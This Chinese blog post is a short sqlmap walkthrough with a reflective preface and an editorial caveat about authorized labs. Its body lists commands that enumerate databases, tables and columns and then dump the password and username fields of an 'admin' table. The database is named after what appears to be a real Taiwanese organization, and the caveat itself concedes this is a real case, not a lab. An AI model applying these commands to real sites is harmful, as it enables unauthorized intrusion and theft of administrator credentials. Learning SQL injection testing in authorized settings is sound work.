ailx10说：这篇是在2023年8月之前写的，后来又改过。手工理解了数据库、表和字段以后，再看 sqlmap 那些选项，终于不只是背参数了。我把常见的枚举顺序先排出来，再补上 POST 请求文件、数据库类型和 tamper 的情况，让每一步都能接回前面的注入思路。文章里的工具输出像给学习节奏加了一层自动化，但也让我更清楚，知道想问什么才好配置工具。写这篇就是为以后留一张顺手的小路线，遇到实验时不用在一长串帮助信息里重新摸索入口。

---

本文是 sqlmap 的历史入门索引，包括数据库、表和字段的枚举；只应在明确授权的实验环境中验证。

核查提示：POST与tamper只提及未展开；真实案例叙述非完整授权靶场课程，导读以本地环境衔接。 旧版内容与实验仍需逐项核验。

sqlmap注入，获得数据库名称（**--dbs**）

```
sqlmap -u "https://****" --dbs
```

![](/notes-assets/029c0af2f0f01497548f.webp)

sqlmap注入，获得数据库中的所有表名（**-D 数据库名称 --tables**）

```
sqlmap -u "https://***" -D toaa2001_org_tw --tables
```

![](/notes-assets/1a99f872bafe2af9a44b.webp)

sqlmap注入，获得数据库中的表中的所有字段（**-D 数据库名 -T 表名 --columns**）

```
sqlmap -u "https://***" -D toaa2001_org_tw -T admin --columns
```

![](/notes-assets/b3566e0645e433e1c673.webp)

sqlmap注入，获得数据库中的表中的字段的值（**-D 数据库名 -T 表名 -C 字段1,字段2 --dump**）

```
sqlmap -u "https://***" -D toaa2001_org_tw -T admin -C A_Pass,A_User --dump
```
